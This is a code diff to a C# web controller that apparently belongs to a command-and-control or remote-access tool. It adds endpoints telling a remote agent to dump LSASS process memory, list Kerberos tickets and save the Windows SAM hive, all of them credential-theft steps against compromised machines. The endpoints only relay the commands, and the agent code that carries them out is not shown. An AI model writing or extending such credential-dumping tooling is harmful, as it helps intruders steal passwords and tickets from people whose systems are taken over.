@@ -66,4 +66,26 @@ public class OtherSoftController : ControllerBase
         return await RelayAndWaitAsync(agentId, "othersoft.rdp", null, ct, 30);
     }
 
+    [HttpPost("{agentId}/lsass")]
+    public async Task<IActionResult> DumpLsass(string agentId, [FromBody] JsonElement body, CancellationToken ct)
+    {
+        var path = body.TryGetProperty("path", out var p) ? p.GetString() ?? "" : "";
+        return await RelayAndWaitAsync(agentId, "othersoft.lsass",
+            string.IsNullOrEmpty(path) ? null : new { path }, ct, 60);
+    }
+
+    [HttpPost("{agentId}/klist")]
+    public async Task<IActionResult> Klist(string agentId, CancellationToken ct)
+    {
+        return await RelayAndWaitAsync(agentId, "othersoft.klist", null, ct, 30);
+    }
+
+    [HttpPost("{agentId}/sam")]
+    public async Task<IActionResult> SaveSam(string agentId, [FromBody] JsonElement body, CancellationToken ct)
+    {
+        var dir = body.TryGetProperty("dir", out var d) ? d.GetString() ?? "" : "";
+        return await RelayAndWaitAsync(agentId, "othersoft.sam",
+            string.IsNullOrEmpty(dir) ? null : new { dir }, ct, 30);
+    }
+
 }
